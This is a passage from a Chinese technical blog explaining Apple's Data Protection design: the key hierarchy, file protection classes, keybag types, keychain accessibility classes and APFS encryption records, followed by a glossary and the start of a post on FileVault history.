keybag（系统密钥包）之中</p>\n</blockquote>\n<p>这种设计方案的主要优势在于：</p>\n<ol>\n<li>实现了“一件一密”，每个文件都有独立的密钥<code>Per-file Key</code>，加密强度大大提高</li>\n<li><code>Class Key</code>实现对文件不同级别的保护（最高级别只有在设备解锁状态下才可用），一个密钥就可以解封对应级别所有文件的<code>Per-file Key</code>；当用户修改<code>Passcode</code>时，只需重置<code>Class Key</code>并对元数据中的文件密钥重新封装即可，原始文件无需重新加密，兼顾了安全性和灵活性</li>\n<li><code>Filesystem Key</code>在 iOS 安装时或每次设备数据被清除时生成，其目标不是保护数据的机密性，而是用于实现快速清除数据，即一旦<code>Filesystem Key</code>被删除，设备上所有文件将永久无法解密</li>\n<li>所有加密处理由 AES Engine 的硬件处理，性能有保障；同时所有密钥由 Secure Enclave 统一管理，不对外泄露，确保安全性并对上层应用透明</li>\n<li>文件数据有<code>Class Key</code>和<code>Filesystem Key</code>两层密钥，并最终由<code>UID</code>和<code>Passcode</code>提供保护，考虑到用户设置<code>Passcode</code>的强度不高，Apple还专门强化了安全隔区的反重放机制以提高安全性</li>\n</ol>\n<blockquote>\n<p>When a file is opened, its metadata is decrypted with the file system key, revealing the wrapped per-file key and a notation on which class protects it. The per-file (or per-extent) key is unwrapped with the class key and then supplied to the hardware AES Engine, which decrypts the file as it’s read from flash storage. All wrapped file key handling occurs in the Secure Enclave; the file key is never directly exposed to the Application Processor.</p>\n</blockquote>\n<h2 id=\"二、数据保护等级\"><a href=\"#二、数据保护等级\" class=\"headerlink\" title=\"二、数据保护等级\"></a>二、数据保护等级</h2><p>设备中我们需要对不同的文件提供不同程度的保护。iOS 上每个文件创建时都会被指定一个级别，每个级别对应一个<code>Class Key</code>。</p>\n<h3 id=\"A类：完全保护，Complete-Protection\"><a href=\"#A类：完全保护，Complete-Protection\" class=\"headerlink\" title=\"A类：完全保护，Complete Protection\"></a>A类：完全保护，Complete Protection</h3><ul>\n<li>该类密钥通过从用户密码和设备 UID 派生的密钥得到保护。用户锁定设备后不久（如果 “需要密码” 设置为 “立即”，则为10秒钟），解密的类密钥会被丢弃，此类的所有数据都无法访问，除非用户再次输入密码或使用触控 ID 或面容 ID 解锁（登录）设备。</li>\n<li>在 macOS 中，上一个用户退出登录不久后，解密的类密钥会被丢弃，此类的所有数据都无法访问，直到某位用户再次输入密码或使用触控 ID 登录设备。</li>\n</ul>\n<h3 id=\"B类：未打开文件保护，Protected-Unless-Open\"><a href=\"#B类：未打开文件保护，Protected-Unless-Open\" class=\"headerlink\" title=\"B类：未打开文件保护，Protected Unless Open\"></a>B类：未打开文件保护，Protected Unless Open</h3><ul>\n<li>设备锁定或用户退出登录时，可能需要写入部分文件（如后台下载邮件附件）。此行为通过使用非对称椭圆曲线加密技术（基于 Curve25519 的 ECDH）实现。普通的文件独有密钥通过使用一次性迪菲-赫尔曼密钥交换协议（One-Pass Diffie-Hellman Key Agreement，如 NIST SP 800-56A 中所述）派生的密钥进行保护。</li>\n<li>该协议的临时公钥与封装的文件独有密钥一起储存。 KDF 是串联密钥导出函数 (Approved Alternative 1)，如 NIST SP 800-56A 中 5.8.1 所述。AlgorithmID 已忽略。 PartyUInfo 和 PartyVInfo 分别是临时公钥和静态公钥。SHA256 被用作哈希函数。一旦文件关闭，文件独有密钥就会从内存中擦除。要再次打开该文件，系统会使用 “未打开文件的保护” 类的私钥和文件的临时公钥重新创建共享密钥，用来解开文件独有密钥的封装，然后用文件独有密钥来解密文件。</li>\n<li>在 macOS 中，只要系统上的任何用户已登录或认证即可访问 NSFileProtectionCompleteUnlessOpen 的私有部分。</li>\n</ul>\n<h3 id=\"C类：首次用户认证前保护，Protected-Until-First-User-Authentication\"><a href=\"#C类：首次用户认证前保护，Protected-Until-First-User-Authentication\" class=\"headerlink\" title=\"C类：首次用户认证前保护，Protected Until First User Authentication\"></a>C类：首次用户认证前保护，Protected Until First User Authentication</h3><ul>\n<li>此类和 “全面保护” 类的行为方式相同，只不过在设备锁定或用户退出登录时已解密的类密钥不会从内存中删除。此类中的保护与桌面电脑全宗卷加密有类似的属性，可防止数据受到涉及重新启动的攻击。这是未分配给数据保护类的所有第三方 App 数据的默认类。</li>\n<li>在 macOS 中，此类的作用类似于文件保险箱，且使用只要宗卷装载即可访问的宗卷密钥。</li>\n</ul>\n<blockquote>\n<p>由于 MacOS 的 FileVault 是单密钥系统，实际上技术架构仅能支持 Class C</p>\n</blockquote>\n<h3 id=\"D类：无保护，No-Protection\"><a href=\"#D类：无保护，No-Protection\" class=\"headerlink\" title=\"D类：无保护，No Protection\"></a>D类：无保护，No Protection</h3><ul>\n<li>此类密钥仅受 UID 的保护，并且存储在可擦除存储器中（即 DKey 密钥）。由于解密该类中的文件所需的所有密钥都储存在设备上，因此采用该类加密的唯一好处就是可以进行快速远程擦除。即使未向文件分配数据保护类，此文件仍会以加密形式储存 （就像 iOS 和 iPadOS 设备上的所有数据那样）。</li>\n<li>macOS 不支持该类型。</li>\n</ul>\n<h2 id=\"三、钥匙包（keyBag）数据保护\"><a href=\"#三、钥匙包（keyBag）数据保护\" class=\"headerlink\" title=\"三、钥匙包（keyBag）数据保护\"></a>三、钥匙包（keyBag）数据保护</h2><p>系统密钥包是一个加密的 <code>plist</code> 格式的二进制文件，存储了所有类密钥的数据，Apple 系统的数据解密实现方式见下图。</p>\n<p><img src=\"/2024/01/27/Apple%20Data%20Protection%E7%9A%84%E5%8A%9F%E8%83%BD%E6%A6%82%E8%A7%88/daemon.png\" alt=\"Daemon\"></p>\n<p>有五种不同类型的钥匙包，但数据格式完全相同，包括：</p>\n<h3 id=\"1-用户密钥包-User-keyBag\"><a href=\"#1-用户密钥包-User-keyBag\" class=\"headerlink\" title=\"1. 用户密钥包(User keyBag)\"></a>1. 用户密钥包(User keyBag)</h3><p>用户密钥包是设备常规操作中使用的封装类密钥的储存位置。例如，输入密码后，<code>NSFileProtectionComplete</code>会从用户密钥包中载入并解封。它是储存在“无保护”类中的二进制属性列表 (.plist) 文件。<br>对于搭载 A9 之前的 SoC 的设备，该 .plist 文件的内容<strong>通过保存在可擦除存储器中的密钥（Bag1 Key）加密</strong>。为了给密钥包提供前向安全性，用户每次更改密码时，系统都会擦除并重新生成此密钥。<br>对于搭载 A9 或后续型号 SoC 的设备，该 .plist 文件包含一个密钥，表示<strong>密钥包储存在受反重放随机数（由安全隔区控制）保护的有锁储存库中</strong>。</p>\n<h3 id=\"2-设备密钥包-Device-keyBag\"><a href=\"#2-设备密钥包-Device-keyBag\" class=\"headerlink\" title=\"2. 设备密钥包 (Device keyBag)\"></a>2. 设备密钥包 (Device keyBag)</h3><p>设备密钥包用来储存用于涉及设备特定操作数据的封装类密钥。 配置为共用的 iPadOS 设备有时需要在用户登录前访问凭证，因此需要一个不受用户密码保护的密钥包。<br>iOS 和 iPadOS 不支持对用户独有的文件系统内容进行单独加密，这就意味着系统使用来自设备密钥包的类密钥，对文件独有密钥进行封装，而钥匙串则使用来自用户密钥包中的类密钥来保护用户钥匙串中的项目。<br>在配置为单用户使用 (默认配置) 的 iOS 和 iPadOS 设备中，<strong>设备密钥包和用户密钥包是同一个</strong>，并受用户的密码保护。</p>\n<h3 id=\"3-备份密钥包（Backup-keyBag）\"><a href=\"#3-备份密钥包（Backup-keyBag）\" class=\"headerlink\" title=\"3. 备份密钥包（Backup keyBag）\"></a>3. 备份密钥包（Backup keyBag）</h3><p>备份密钥包在 “访达” (macOS 10.15 或更高版本) 或 iTunes (macOS 10.14 或更低版本) 进行加密备份时创建，并储存在设备被备份到的电脑中。<br>新密钥包是通过一组新密钥创建的，<strong>备份的数据会使用这些新密钥重新加密</strong>。 如前所述，不可迁移钥匙串项仍使用 UID 派生密钥封装，以使其可以恢复到最初备份它们的设备，但在其他设备上不可访问。<br>由于备份密钥包并未捆绑特定设备，理论上尝试在多台电脑上对备份密钥包并行展开暴力破解是可行的。<br>如果用户选择不加密备份，那么不管备份文件属于哪一种数据保护类，备份文件都不加密，但钥匙串仍使用 UID 派生密钥获得保护。这就是只有设置备份密码才能将钥匙串项迁移到新设备的原因。</p>\n<h3 id=\"4-托管密钥包（Escrow-keybag）\"><a href=\"#4-托管密钥包（Escrow-keybag）\" class=\"headerlink\" title=\"4. 托管密钥包（Escrow keybag）\"></a>4. 托管密钥包（Escrow keybag）</h3><p>托管密钥包用于通过 USB 与 “访达” (macOS 10.15 或更高版本) 或 iTunes (macOS 10.14 或更低版 本) 进行同步， 还用于移动设备管理 (MDM)。 此密钥包允许 “访达” 或 iTunes 执行备份和同步， 而无需用户输入密码，它还允许 MDM 解决方案远程清除用户密码。它储存在用于与 “访达” 或 iTunes 进行同步的电脑上，或者在远程管理设备的 MDM 解决方案上。</p>\n<p>托管密钥包改善了设备同步过程中的用户体验，期间可能需要访问所有类别的数据。当使用密码锁定的设备首次连接到 “访达” 或 iTunes 时，会提示用户输入密码。然后设备创建托管密钥包，其中包含的类密钥与设备上使用的完全相同，该密钥包由新生成的密钥进行保护。托管密钥包及用于保护它的密钥划分到设备和主机或服务器上，其数据以 “首次用户认证前保护” 类储存在设备上。这就是重新启动后，用户首次使用 “访达” 或 iTunes 进行备份之前必须输入设备密码的原因。</p>\n<h3 id=\"5-云备份密钥包（iCloud-Backup-keybag）\"><a href=\"#5-云备份密钥包（iCloud-Backup-keybag）\" class=\"headerlink\" title=\"5.云备份密钥包（iCloud Backup keybag）\"></a>5.云备份密钥包（iCloud Backup keybag）</h3><p>iCloud 云备份密钥包与备份密钥包类似。 该密钥包中的所有类密钥都是非对称的 (与 “未打开文件的保护”数据保护类一样， 使用 Curve25519)。<br>非对称密钥包还可用于 “iCloud 钥匙串” 钥匙串恢复中的备份。</p>\n<h2 id=\"四、钥匙串-Key-Chain-数据保护\"><a href=\"#四、钥匙串-Key-Chain-数据保护\" class=\"headerlink\" title=\"四、钥匙串 (Key Chain)数据保护\"></a>四、钥匙串 (Key Chain)数据保护</h2><p>许多 App 都需要处理密码和其他一些简短但比较敏感的数据，如密钥和登录令牌。钥匙串提供了储存这些项的安全方式。不同的 Apple 操作系统采用不同机制实施与各钥匙串保护类关联的保障。<br>在 macOS (包括搭 载 Apple 芯片的 Mac) 中，数据保护不直接用于实施此类保障。</p>\n<p>钥匙串项使用两种不同的 AES-256-GCM 密钥加密 : 表格密钥 (元数据) 和行独有密钥 (私密密钥)。钥匙串元数据 (除 kSecValue 外的所有属性) 使用元数据密钥加密以加速搜索，私密值 (kSecValueData) 使用私密密钥进行加密。元数据密钥受安全隔区保护，但会缓存在应用程序处理器中以便进行钥匙串快速查询。私密密钥则始终需要通过安全隔区进行往返处理。</p>\n<blockquote>\n<p>元数据密钥就是 EMF key，私密密钥根据 WARP 类型不同采用 Dkey 或 Dkey + Passcode Key</p>\n</blockquote>\n<p>钥匙串以储存在文件系统中的<code>SQLite</code>数据库的形式实现， 而且数据库只有一个<code>securityd</code>监控程序决定每个进程或 App 可以访问哪些钥匙串项。钥匙串访问 API 将生成对监控程序的调用，从而查询 App 的 “keychain-access-groups”、 “application-identifier” 和 “application-group” 权限。访问组允许在 App 之间共享钥匙串项，而非将访问权限限制于单个进程。</p>\n<h3 id=\"1-类型定义\"><a href=\"#1-类型定义\" class=\"headerlink\" title=\"1. 类型定义\"></a>1. 类型定义</h3><table>\n<thead>\n<tr>\n<th align=\"center\">Keychain的数据保护类型</th>\n<th align=\"center\">File的数据保护类型</th>\n<th align=\"center\">适用场景</th>\n</tr>\n</thead>\n<tbody><tr>\n<td align=\"center\">kSecAttrAccessibleWhenUnlocked</td>\n<td align=\"center\">NSFileProtectionComplete</td>\n<td align=\"center\">未锁定状态</td>\n</tr>\n<tr>\n<td align=\"center\">N&#x2F;A</td>\n<td align=\"center\">NSFileProtectionCompleteUnlessOpen</td>\n<td align=\"center\">锁定状态</td>\n</tr>\n<tr>\n<td align=\"center\">kSecAttrAccessibleAfterFirstUnlock</td>\n<td align=\"center\">NSFileProtectionCompleteUntilFirstUserAuthentication</td>\n<td align=\"center\">首次解锁后</td>\n</tr>\n<tr>\n<td align=\"center\">kSecAttrAccessibleAlways</td>\n<td align=\"center\">NSFileProtectionNone</td>\n<td align=\"center\">始终</td>\n</tr>\n</tbody></table>\n<p>三个钥匙串类都有对应的<code>ThisDeviceOnly</code>项目，后者在备份期间从设备拷贝时始终通过 UID 加以保护，因此如果恢复至其他设备将无法使用，例如 VPN 证书不适合迁移至另一台设备。</p>\n<p>文件的 Class B 使用了非对称加密算法，钥匙串不提供相应的 Class key。如果 APP 确实存在后台更新的需求，官方建议使用<code>kSecAttrAccessibleAfterFirstUnlock</code>，即对应 Class C。</p>\n<p>还有一个特殊类型<code>kSecAttrAccessibleWhenPasscodeSetThisDeviceOnly</code>，其仅存在于系统密钥包，行为方式与<code>kSecAttrAccessibleWhenUnlocked</code>相同。一旦用户密码被移除或重设，该类密钥便会丢弃，且不会备份、不同步到 iCloud 钥匙串、不包括在托管密钥包。</p>\n<p>从 iOS 14 开始，<code>kSecAttrAccessibleAlways</code>和<code>kSecAttrAccessibleAlwaysThisDeviceOnly</code>被弃用！请参考<a href=\"https://developer.apple.com/documentation/security/ksecattraccessiblealways\">Apple开发手册</a>，</p>\n<h3 id=\"2-典型场景\"><a href=\"#2-典型场景\" class=\"headerlink\" title=\"2. 典型场景\"></a>2. 典型场景</h3><p>Apple 根据所保护信息的类型以及 iOS 和 iPadOS 需要这些信息的时间来选择钥匙串类，妥善平衡了安全性和可用性。例如，VPN 证书必须始终可用，这样设备才能保持连接，但它归类为 “不可迁移”， 因此不能将其移至另一台设备.</p>\n<table>\n<thead>\n<tr>\n<th align=\"center\">Item</th>\n<th align=\"center\">Accessibility</th>\n</tr>\n</thead>\n<tbody><tr>\n<td align=\"center\">Wi-Fi passwords</td>\n<td align=\"center\">Always</td>\n</tr>\n<tr>\n<td align=\"center\">IMAP&#x2F;POP&#x2F;SMTP accounts</td>\n<td align=\"center\">AfterFirstUnlock</td>\n</tr>\n<tr>\n<td align=\"center\">Exchange accounts</td>\n<td align=\"center\">Always</td>\n</tr>\n<tr>\n<td align=\"center\">VPN</td>\n<td align=\"center\">Always</td>\n</tr>\n<tr>\n<td align=\"center\">LDAP&#x2F;CalDAV&#x2F;CardDAV accounts</td>\n<td align=\"center\">Always</td>\n</tr>\n<tr>\n<td align=\"center\">iTunes backup password</td>\n<td align=\"center\">WhenUnlockedThisDeviceOnly</td>\n</tr>\n<tr>\n<td align=\"center\">Device certificate &amp; private key</td>\n<td align=\"center\">AlwaysThisDeviceOnly</td>\n</tr>\n</tbody></table>\n<h2 id=\"五、简要分析\"><a href=\"#五、简要分析\" class=\"headerlink\" title=\"五、简要分析\"></a>五、简要分析</h2><h3 id=\"1-为什么用户修改-passcode-需要较长的处理时间？\"><a href=\"#1-为什么用户修改-passcode-需要较长的处理时间？\" class=\"headerlink\" title=\"1. 为什么用户修改 passcode 需要较长的处理时间？\"></a>1. 为什么用户修改 passcode 需要较长的处理时间？</h3><p>用户文件的内容是基于 per-file key（或者VEK）加密的，修改 passcode 无需重新加密内容！但是，此时作为 KEK 的 passcode key 发生变化，需要重新计算并存储文件系统元数据中的 per-file key 密文和相应的 Class key。</p>\n<blockquote>\n<p>文件的内容可能使用文件独有(或范围独有)的一个或多个密钥进行加密，密钥使用类密钥封装并储存在文件的元数据中，文件元数据又使用文件系统密钥进行加密。类密钥通过硬件 UID 获得保护，而某些类的类密钥则通过用户密码获得保护。此层次结构既可提供灵活性，又可保证性能。例如，更改文件的类只需重新封装其文件独有密钥，更改密码只需重新封装类密钥。</p>\n</blockquote>\n<p>实际测试中，iPhone 或 Macbook 修改 passscode 需要大约 15 分钟处理时间，与重新加密数据文件对比，这个代价是值得的，体现了多层次密钥架构的优势。</p>\n<h3 id=\"2-UUID-和-UDID-的区别是什么？\"><a href=\"#2-UUID-和-UDID-的区别是什么？\" class=\"headerlink\" title=\"2. UUID 和 UDID 的区别是什么？\"></a>2. UUID 和 UDID 的区别是什么？</h3><p>简单说，UUID 是基于应用的唯一标识符，UDID 是基于设备的唯一标识符（注意区别于 UID）。</p>\n<p>UDID (Unique Device Identifier，唯一设备标识符) 是一个由 40 个字符组成的十六进制序列，用于唯一标识一台苹果设备。它相当于设备的指纹，使得软件开发者和服务提供商能够提供个性化的设备识别服务。<br>UDID 可以被设备用户查询，例如 Mac 笔记本用户可以在<code>系统信息-硬件概览</code>中查看硬件 UDID。<br><img src=\"/2024/01/27/Apple%20Data%20Protection%E7%9A%84%E5%8A%9F%E8%83%BD%E6%A6%82%E8%A7%88/UDID.png\" alt=\"UDID\"></p>\n<p>构造算法：<code>UDID = SHA1(序列号 + ECID + Lowcase (WiFi MAC地址) + Lowcase(蓝牙 MAC地址))</code><br>UDID 由于其唯一性，如果被泄露，恶意方可能会跟踪用户的活动或跨应用行为。因此，保护 UDID 以及使用它时要遵循隐私法和透明度原则是必要的。</p>\n<p>UUID（Universally Unique Identifier，通用唯一标识符）是一个由 RFC 4122 定义的 128 位序列（ 32 个字符的十六进制），基于设备上的某个特定应用的数据项定义。只要用户没有完全删除应用，那么此标识符将在应用启动之间保留，并且至少允许您在设备上使用特定应用来识别同一数据项。<br>UUID 保证跨空间和时间的唯一性，但是如果用户完全删除然后重新安装应用程序，则 ID 将被更改。</p>\n<h3 id=\"3-数据保护概览的解读\"><a href=\"#3-数据保护概览的解读\" class=\"headerlink\" title=\"3. 数据保护概览的解读\"></a>3. 数据保护概览的解读</h3><p>数据保护通过构建和管理密钥层级来实施，并建立在 Apple 设备内建的硬件加密技术基础上。它通过将某个类分配给每个文件来实现对文件的逐个控制； 可访问性根据该类密钥是否已解锁确定。APFS（Apple 文件系统）使文件系统可进一步以各个范围为基础对密钥进行细分（文件的各个部分可以拥有不同的密钥）。</p>\n<p>每次在数据宗卷中创建文件时，数据保护都会创建一个新的 256 位<strong>文件独有密钥（per-file key）</strong>，并将其提供给硬件 AES 引擎，此引擎会使用该密钥在文件写入闪存时对其进行加密。在搭载 A14 和 M1 的设备上，加密在 XTS 模式中使用 AES-256，其中 256 位文件独有密钥通过密钥派生功能<a href=\"https://nvlpubs.nist.gov/nistpubs/SpecialPublications/NIST.SP.800-108r1.pdf\">NIST Special Publication 800-108</a> 派生出一个 256 位 tweak 密钥和一个 256 位 cipher 密钥。采用 A9 到 A13、 S5 和 S6 的每一代硬件在 XTS 模式中使用 AES-128，其中 256 位文件独有密钥会被拆分，以提供一个 128 位 tweak 密钥和一个 128 位 cipher 密钥。</p>\n<blockquote>\n<p>对于采用 FBE 加密模式的 iOS 设备，APFS 的文件系统元数据定义了<code>CRYPTO_STATE</code>记录类型，其中<code>state.persistent_class</code>字段的描述为：The protection class associated with the key；<code>state.persistent_key</code>字段的描述为：The wrapped key data.<br>随着 AES-128 升级为 AES-256，per-file key 的存储长度发生变化，为了避免修改 AFPS 数据结构，Apple 修改了 cipher key 的管理方式</p>\n</blockquote>\n<p>在搭载 Apple 芯片的 Mac 上，数据保护默认为 C 类（请参阅数据保护类），但使用<strong>宗卷密钥（Volume Encryption Key，VEK）</strong>，而非范围独有密钥或文件独有密钥，可为用户数据高效重建 FileVault 安全模型。用户仍须选择使用 FileVault，以获得加密密钥层级搭配用户密码的全面保护。开发者也可以选择使用文件独有密钥或范围独有密钥的更高保护类。</p>\n<blockquote>\n<p>对于采用 FDE 加密模式的 MacOS，Ciper key 都是 VEK，因此 AFPS 不包含<code>CRYPTO_STATE</code>记录类型，而是在<code>FILE_EXTENT</code>记录类型的<code>crypto_id</code>字段存储了 Tweak key</p>\n</blockquote>\n<p>在支持数据保护的 Apple 设备上，每个文件通过唯一的<strong>文件独有密钥（per-file key）或范围独有密钥（per-extent key）</strong>进行保护。该密钥使用 NIST AED 密钥封装算法封装，之后会进一步使用多个<strong>类密钥（Class key）</strong>中的一个进行封装，具体取决于计划如何访问该文件。 随后封装的文件独有密钥储存在文件的元数据中。</p>\n<p>使用 APFS 格式运行的设备可能支持文件克隆（使用写入时拷贝技术的零损耗拷贝）。如果文件被克隆，克隆的每一半都会得到一个新的密钥以接受传入的数据写入，这样新数据会使用新密钥写入媒介。久而久之，文件可能会由不同的范围（或片段）组成，每个映射到不同的密钥。但是，组成文件的所有范围受同一类密钥保护。</p>\n<blockquote>\n<p>APFS 采用 Copy On Write 的快照模式（快照卷存储原始数据，源卷存放更新数据），如果后续某个副本的部分数据被修改，可能造成一个文件被分成多个 Extent，即一个文件系统节点可能包含多个<code>FILE_EXTENT</code>记录，每条记录的<code>crypto_id</code>字段各不相同</p>\n</blockquote>\n<p>当打开一个文件时，系统会使用<strong>文件系统密钥（Volume Key，就是 EMF 或 LwVm）</strong>解密文件的元数据，以显露出封装的文件独有密钥和表示它受哪个类保护的记号。文件独有或范围独有密钥使用类密钥解封，然后提供给硬件 AES 引擎，该引擎会在从闪存中读取文件时对文件进行解密。所有封装文件密钥的处理发生在安全隔区中；文件密钥绝不会直接透露给应用程序处理器。启动时，安全隔区与 AES 引擎协商得到一个临时密钥。当安全隔区解开文件密钥时，它们又通过该临时密钥再次封装，然后发送回应用程序处理器。</p>\n<blockquote>\n<p>SEP 启动时生成临时封装密钥，通过专用线路传送给 AES 引擎，内存掉电时被清除</p>\n</blockquote>\n<p>数据宗卷文件系统中所有文件的元数据都使用<strong>随机宗卷密钥（就是上述的 EMF）</strong>进行加密，该密钥在首次安装操作系统或用户擦除设备时创建。此密钥由<strong>密钥封装密钥（就是 Key 0x89B，由 UID 固定衍生）</strong>加密和封装，密钥封装密钥由安全隔区长期储存，只在安全隔区中可见。每次用户抹掉设备时，它都会发生变化。在 A9（及后续型号）SoC 上，安全隔区依靠由反重放系统支持的熵来实现可擦除性，以及保护其他资源中的密钥封装密钥。有关更多信息，请参阅<strong>安全非易失性存储器（Secure Nonvolatile Storage）</strong>。</p>\n<p>正如文件独有密钥或范围独有密钥一样，数据宗卷的元数据密钥绝不会直接透露给应用程序处理器；相反，<em>安全隔区会提供一个临时的启动独有的版本</em>。储存后，加密的文件系统密钥还会使用储存在可擦除存储器中的“<strong>可擦除密钥（即 BAG1，A9之前的Soc设备适用）</strong>” 封装或者使用受安全隔区反重放机制保护的<strong>媒介密钥封装密钥（即 media key，A9之后的Soc设备适用）</strong>进行封装。此密钥不会提供数据的额外机密性。相反，它可以根据需要快速抹掉（由用户使用 “抹掉所有内容和设置” 选项来抹掉，或者由用户或管理员通过从移动设备管理 (MDM) 解决方案、Microsoft Exchange ActiveSync 或 iCloud 发出远程擦除命令来抹掉）。以这种方式抹掉密钥将导致所有文件因存在加密而不可访问。</p>\n<p>文件的内容可能使用文件独有（或范围独有）的一个或多个密钥进行加密，密钥使用类密钥封装并储存在文件的元数据中，文件元数据又使用文件系统密钥进行加密。类密钥通过硬件 UID 获得保护，而某些类的类密钥则通过用户密码获得保护。此层次结构既可提供灵活性，又可保证性能。例如，更改文件的类只需重新封装其文件独有密钥，更改密码只需重新封装类密钥。</p>\n<hr>\n<h2 id=\"附录：名词解释\"><a href=\"#附录：名词解释\" class=\"headerlink\" title=\"附录：名词解释\"></a>附录：名词解释</h2><h3 id=\"功能组件类\"><a href=\"#功能组件类\" class=\"headerlink\" title=\"功能组件类\"></a>功能组件类</h3><ul>\n<li>Effaceable Storage（可擦除存储器）：NAND 存储器中一个用于储存加密密钥的专用区域，可被直接寻址和安全擦除。尽管当攻击者实际占有设备时，可擦除存储器无法提供保护，但其中存储的密钥可用作密钥层级的一部分，用于实现快速擦除和前向安全性。</li>\n<li>Secure Storage Component（安全储存组件）：一个芯片，设计为使用不可更改的 RO 代码、硬件随机数生成器、加密引擎和物理篡改检测。在支持的设备上，安全隔区与用于储存反重放随机数的安全储存组件配对。为了读取和更新随机数，安全隔区和储存芯片采用安全协议来帮助确保对随机数的排他访问。此技术已更迭多代，提供了不同的安全性保证。</li>\n<li>keybag（密钥包）：一种用于储存一组类密钥的数据结构。每种类型(用户、设备、系统、备份、托管或iCloud云备份)的格式都相同。<ul>\n<li>标头：版本(在 iOS 12 或更高版本中设为 4 )；类型(系统、备份、托管或 iCloud 云备份)；密钥包 UUID；HMAC(若密钥包已签名)；用于封装类密钥的方法：配合盐和迭代计数使用 Tangling 及 UID 或 PBKDF2。</li>\n<li>类密钥列表：密钥 UUID；类(哪个文件或钥匙串数据保护类)；封装类型(仅 UID 派生密钥；UID 派生密钥和密码派生 密钥)；封装的类密钥；非对称类的公钥。</li>\n</ul>\n</li>\n<li>keychain（钥匙串）： 一种基础架构和一组 API、Apple 操作系统和第三方 App，用来储存和检索密码、密钥及其他敏感凭证。</li>\n<li>Boot ROM：设备的处理器在首次启动时所执行的第一个代码。作为处理器不可分割的一部分，Apple或攻击者均无法修改。</li>\n<li>sepOS：安全隔区固件，基于 Apple 定制版本的 L4 微内核。</li>\n<li>XNU（X is Not Unix）：Apple 操作系统中央的内核。默认为受信任状态，并强制执行代码签名、沙盒化、授权核对和地址空间布局 随机化 (ASLR) 等安全措施。</li>\n</ul>\n<h3 id=\"实体密钥类\"><a href=\"#实体密钥类\" class=\"headerlink\" title=\"实体密钥类\"></a>实体密钥类</h3><ul>\n<li>UID：一个 256 位的 AES 密钥，在设备制造过程中刻录在每个处理器上。这种密钥无法由固件或软件读取，只能由处理器的硬件 AES 引擎使用。若要获取实际密钥，攻击者必须对处理器的芯片发起极为复杂且代价高昂的物理攻击。UID 与设备上的任何其他标识符均无关，包括但不限于 UDID。</li>\n<li>ECID（集成电路 ID）：每台 iOS 和 iPadOS 设备上的处理器所独有的一个 64 位标识符。当在一台设备上接通电话 时，该设备通过低功耗蓝牙 (BLE) 4.0 进行短暂广播，使附近的 iCloud 配对设备停止响铃。广播的字节使用与“接力” 广播相同的方法来加密。作为个性化流程的一部分，此标识符不被视为机密。</li>\n<li>Media key（媒介密钥）：加密密钥层次的一部分，可帮助实现安全的立即擦除。<ul>\n<li>在 iOS、iPadOS、Apple tvOS 和 watchOS 中，媒介密钥会封装数据宗卷上的元数据(因此，没有媒介密钥便无法访问所有文件独有密钥，也就无法访问受数据保护加密方法所保护的文件)。</li>\n<li>在 macOS 中，媒介密钥会封装文件保险箱所保护宗卷上的密钥材料、所有元数据和数据。</li>\n</ul>\n</li>\n<li>per-file key（文件独有密钥）：数据保护用于在文件系统上加密文件的密钥。文件独有密钥使用类密钥封装，储存在文件的元数据中。</li>\n<li>filesystem key（文件系统密钥）：用于加密每个文件的元数据的密钥，包括其类密钥。存储在可擦除存储器中，用于实现快速擦除，并非用于保密目的。</li>\n<li>Passcode-derived key（密码派生密钥，PDK）：用户密码与长期 SKP 密钥和安全隔区的 UID 配合使用，由此派生加密密钥。</li>\n</ul>\n<h3 id=\"软件算法类\"><a href=\"#软件算法类\" class=\"headerlink\" title=\"软件算法类\"></a>软件算法类</h3><ul>\n<li>key wrapping（密钥封装&#x2F;包裹）：使用一个密钥来加密另一个密钥。iOS 和 iPadOS 根据 RFC 3394 使用 NIST AES 密钥封装。</li>\n<li>Tangling（密钥缠绕）：用户密码转换为密钥并使用设备的 UID 加强的过程。此过程帮助确保暴力攻击只能在特定设备上执行， 因此可限制攻击的频度且避免多部设备同时遭到攻击。Tangling 算法是 PBKDF2。这种算法为每次迭代使用加入 设备 UID 的 AES 密钥作为伪随机函数 (PRF)。</li>\n<li>xART（eXtended Anti-Replay Technology，反重放技术）：一组为具有反重放功能(基于物理储存架构)的安全隔区提供加密且经认证的 永久储存区的服务。</li>\n<li>Sealed Key Protection（密封密钥保护，SKP）：数据保护中的一种技术，其使用系统软件的测量值和仅在硬件中可用的密钥来保护(或密封)加密密钥。</li>\n</ul>\n<hr>\n<h2 id=\"Apple官方文档\"><a href=\"#Apple官方文档\" class=\"headerlink\" title=\"Apple官方文档\"></a>Apple官方文档</h2><ul>\n<li><a href=\"apple-platform-security-guide.pdf\">Apple 平台安全白皮书 - 2022年英文版</a></li>\n<li><a href=\"apple%E5%B9%B3%E5%8F%B0%E5%AE%89%E5%85%A8%E7%99%BD%E7%9A%AE%E4%B9%A6-2021%E4%B8%AD%E6%96%87%E7%89%88.pdf\">Apple 平台安全白皮书 - 2021年中文版</a></li>\n<li><a href=\"iOS%E5%AE%89%E5%85%A8%E7%99%BD%E7%9A%AE%E4%B9%A6-2018%E8%8B%B1%E6%96%87%E7%89%88.pdf\">iOS 安全白皮书 - 2018年英文版</a></li>\n<li><a href=\"Apple_T2_Security_Chip_Overview.pdf\">Apple T2 安全芯片概览</a></li>\n<li><a href=\"Apple-File-System-Reference.pdf\">APFS 文件系统参考手册</a></li>\n</ul>\n"},{"title":"Apple FileVault的技术分析","url":"/2024/01/07/Apple%20FileVault%E7%9A%84%E6%8A%80%E6%9C%AF%E5%88%86%E6%9E%90/","content":"<p>FileVault 的意思是文件保管箱，是 Apple 公司为 Mac 电脑提供的、基于 MacOS 的加密技术方案，其本质归类于 FDE（Full Disk Encryption，全盘加密）。<br>注意！与之对应的，为 iPhone 提供的、基于 iOS 的 DataProtect （数据保护）加密技术方案，其本质归类于 FBE（File Based Encryption，文件加密）。</p>\n<h2 id=\"一、Legacy-FileVault\"><a href=\"#一、Legacy-FileVault\" class=\"headerlink\" title=\"一、Legacy FileVault\"></a>一、Legacy FileVault</h2><p>2003年，Mac OS X Panther (黑豹，10.3) 首次发布了 FileVault，当时的版本只加密了用户的主目录（不包含启动宗卷），方法是采用一个巨大的稀疏磁盘镜像文件（sparse disk image，区别于普通的磁盘镜像文件<code>.dmg</code>，其实际磁盘占用空间是根据使用情况动态扩展的）作为虚拟磁盘，负责存储加密后的文件数据。在启用 FileVault 功能时，系统会要求用户设置一个<strong>主密码</strong>，当用户忘记密码时，需要这个主密码或是恢复密钥直接解密文件。</p>\n<p>2006年，Mac OS X 